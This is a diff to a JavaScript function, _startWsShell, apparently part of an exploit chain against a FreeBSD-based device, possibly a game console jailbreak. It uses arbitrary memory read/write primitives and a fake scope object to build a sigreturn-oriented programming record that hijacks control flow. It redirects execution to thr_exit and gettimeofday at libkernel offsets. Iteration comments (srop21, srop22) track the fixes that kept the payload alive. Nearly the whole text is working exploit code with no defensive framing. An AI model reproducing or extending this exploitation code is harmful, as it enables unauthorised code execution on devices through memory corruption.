@@ -5482,20 +5482,29 @@ function _startWsShell(){
           reply.retSlot={addr:'0x'+retSlotAddr.toString(16),provenance:'V70 constant cfr-0x328 across four boots'};
           SF('2 direct retSlot=0x'+retSlotAddr.toString(16)+' (cfr-0x328)');
 
-          /* (2) THE PARENT RECORD (srop18 = the srop15 full accounting + THE
-           * FS BASE FIX). The kernel copies ONLY: the GPRs (+0x48, 0x90),
-           * the tail (+0xD8, 0x30), FS/GS base (+0x480/+0x488), and the mask
-           * (+0x08). The 814a constants ride along harmlessly; the
-           * +0x280..0x2D8 chain is never read; the live VM pair (+0x38/0x40)
-           * is skipped so a 417 REJECTION still returns through the
-           * trampoline alive (the fire19 proof). THE FIX: +0x480 = the
-           * discovered live FS base, +0x488 = 0 (the captured GS). */
-          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n;
+          /* (2) THE PARENT RECORD AT B2 (srop22 - THE SCOPE-RECORD
+           * COLLISION FIX). srop21's rehearsal call died AFTER the record
+           * build: the record-at-CAP loop zeroed the scope's live fields
+           * (+0x00-0x37 minus the VM pair) and the next native call through
+           * that scope died - THE SECOND structural killer, alongside the
+           * stale FS base (srop19's correct-FS rt died the same way; fire19
+           * survived because its gates lived in a DIFFERENT buffer). THE
+           * FIX: the record lives at B2=CAP+0x2000 (proven mapped),
+           * pre-cloned with the live scope head so B2 is a VALID scope for
+           * the call path (the VM pair preserved by construction), the mask
+           * region (+0x08-0x28) zeroed (proven survivable), and the 417
+           * call passes RDI=B2. The kernel reads the record; the call path
+           * sees a valid scope; nothing poisons anything. */
+          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n,B2=CAP+0x2000n;
           for(var zS=0;zS<0x500/8;zS++)S.absWrite(CTX+BigInt(zS*8),0n);
           S.absWrite(WIT,0n);
           S.absWrite(STK,lkS+0x13EC0n);
           reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
-          var K814={128:0x2FECE976n,136:cfrS,144:0x515CA11n,152:0x4B1AA0n,
+          var headS=S.absRead(CAP,0x48);
+          for(var hW=0;hW<headS.length;hW++)S.absWrite(B2+BigInt(hW*8),headS[hW]);
+          for(var mW=1;mW<5;mW++)S.absWrite(B2+BigInt(mW*8),0n);   /* +0x08-0x28 = the empty mask */
+          var K814={72:0n,80:0n,88:0n,96:0n,104:0n,112:0n,120:0n,
+                   128:0x2FECE976n,136:cfrS,144:0x515CA11n,152:0x4B1AA0n,
                    160:0xFFFFFFFFn,176:0x2FD98042n,184:0x2FD98042n,
                    192:0x1B001300000000n,208:0x3B003B00000001n,
                    232:0x43n,240:0x202n,256:0x3Bn,
@@ -5505,9 +5514,8 @@ function _startWsShell(){
                    464:0x8180000000000000n,472:0x4007n,
                    560:0x3FF0000000000000n,624:0xFFFFFFFFFFFFFFFFn,632:0xFFFFFFFFFFFFFFFFn,
                    832:0x7n,1152:fsB,1160:0n};
-          for(var rW=0;rW<0x4C0;rW+=8){
-            if(rW===0x38||rW===0x40)continue;
-            S.absWrite(CAP+BigInt(rW),(K814[rW]!==undefined)?K814[rW]:0n);
+          for(var rW=0x48;rW<0x4C0;rW+=8){
+            S.absWrite(B2+BigInt(rW),(K814[rW]!==undefined)?K814[rW]:0n);
           }
           reply.recordReplicated=true;
           /* the child starts at the identified Thrd_exit import. Only the
@@ -5535,49 +5543,43 @@ function _startWsShell(){
           }
           var isRT=(msg.mode==='rt');
 
-          /* (3) THE MODE PATCHES on the record at CAP. mode=ic is the
-           * INSTALL-CONTROL (the 1359a [B] mechanics control): RIP = the
-           * return address the call itself pushed at [retSlot], RSP =
-           * cfr-0x320 (the post-call value) - the iretq resumes the
-           * trampoline exactly as a normal callee return. No target runs.
-           * SURVIVES = the install (gates+copies+FS/GS+the stack switch)
-           * proven; DIES = the install itself. */
+          /* (3) THE MODE PATCHES on the record at B2. mode=ic = the
+           * INSTALL-CONTROL: a harmless gettimeofday through the SAME call
+           * site with RDI=B2 (its push writes the return address; its ret
+           * pops but LEAVES the value), then RIP = that value and RSP =
+           * cfr-0x320 - the iretq resumes the trampoline exactly as a
+           * normal callee return, no target runs. SURVIVES = the install
+           * proven; DIES = the install itself. rt/real = the target modes
+           * (the rt's tv lands at B2+0x800, beyond the record). */
           var isIC=(msg.mode==='ic');
           if(isIC){
-            /* THE REHEARSAL-FIRST RETSLOT READ (srop21): the PRE-call slot
-             * is stale (0xa on the 08:13 boot - no trampoline call had run).
-             * The push writes the return address DURING the call, and a ret
-             * pops the slot but LEAVES the value - so run one harmless
-             * rehearsal through the SAME call site (gettimeofday, E2-proven)
-             * and read the slot AFTER it: the value = exactly what the 417
-             * call's own push will write. */
-            SF_CALL(lkS+0xB50n,CAP);
+            SF_CALL(lkS+0xB50n,B2);
             var retv=S.absRead(retSlotAddr,8)[0];
             reply.icRet='0x'+retv.toString(16);
             if(!(retv>=0x800000000n&&retv<0x1000000000n)){
               reply.err='retSlot still not a code return after the rehearsal';break;
             }
-            S.absWrite(CAP+0x0E0n,retv);
-            S.absWrite(CAP+0x0F8n,retSlotAddr+0x8n);
-            S.absWrite(CAP+0x048n,0n);
-            S.absWrite(CAP+0x050n,0n);
+            S.absWrite(B2+0x0E0n,retv);
+            S.absWrite(B2+0x0F8n,retSlotAddr+0x8n);
+            S.absWrite(B2+0x048n,0n);
+            S.absWrite(B2+0x050n,0n);
             SF('3 INSTALL-CONTROL RIP=[retSlot post-rehearsal] RSP=cfr-0x320 (no target)');
           }else if(msg.mode==='rt'){
-            S.absWrite(CAP+0x048n,CAP);     /* tv buffer = the scope head (E2-proven) */
-            S.absWrite(CAP+0x050n,0n);      /* tz = NULL */
-            S.absWrite(CAP+0x0E0n,lkS+0xB50n);
+            S.absWrite(B2+0x048n,B2+0x800n);   /* the tv buffer = beyond the record */
+            S.absWrite(B2+0x050n,0n);          /* tz = NULL */
+            S.absWrite(B2+0x0E0n,lkS+0xB50n);
             SF('3 ROUNDTRIP target=gettimeofday (no thr_create)');
           }else{
-            S.absWrite(CAP+0x048n,CTX);
-            S.absWrite(CAP+0x050n,WIT);
-            S.absWrite(CAP+0x0E0n,lkS+0x13D20n);
+            S.absWrite(B2+0x048n,CTX);
+            S.absWrite(B2+0x050n,WIT);
+            S.absWrite(B2+0x0E0n,lkS+0x13D20n);
             SF('3 child RIP=thr_exit parent=(RDI=ctx,RSI=wit,RDX=0) fsbase installed');
           }
-          S.absWrite(CAP+0x058n,0n);
-          S.absWrite(CAP+0x0F8n,retSlotAddr);
+          S.absWrite(B2+0x058n,0n);
+          S.absWrite(B2+0x0F8n,retSlotAddr);
 
-          /* (4) THE INSTALL: sigreturn reads the record at RDI=CAP. */
-          var origSr=SF_CALL(lkS+0x13ED0n,CAP);
+          /* (4) THE INSTALL: sigreturn reads the record at RDI=B2. */
+          var origSr=SF_CALL(lkS+0x13ED0n,B2);
           reply.sigreturnRestored=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origSr);
           if(isIC){
             SF('4 INSTALL-CONTROL SURVIVED - the install is PROVEN');
@@ -5585,7 +5587,7 @@ function _startWsShell(){
             break;
           }
           if(isRT){
-            var tvSec=S.absRead(CAP,8)[0],tvUsec=S.absRead(CAP+8n,8)[0];
+            var tvSec=S.absRead(B2+0x800n,8)[0],tvUsec=S.absRead(B2+0x808n,8)[0];
             reply.roundtrip={sec:'0x'+tvSec.toString(16),usec:'0x'+tvUsec.toString(16),
                              valid:(tvSec>0x40000000n&&tvSec<0x80000000n&&tvUsec<0xF4240n)};
             SF('4 ROUNDTRIP parent ALIVE sec=0x'+tvSec.toString(16)+' usec=0x'+tvUsec.toString(16));
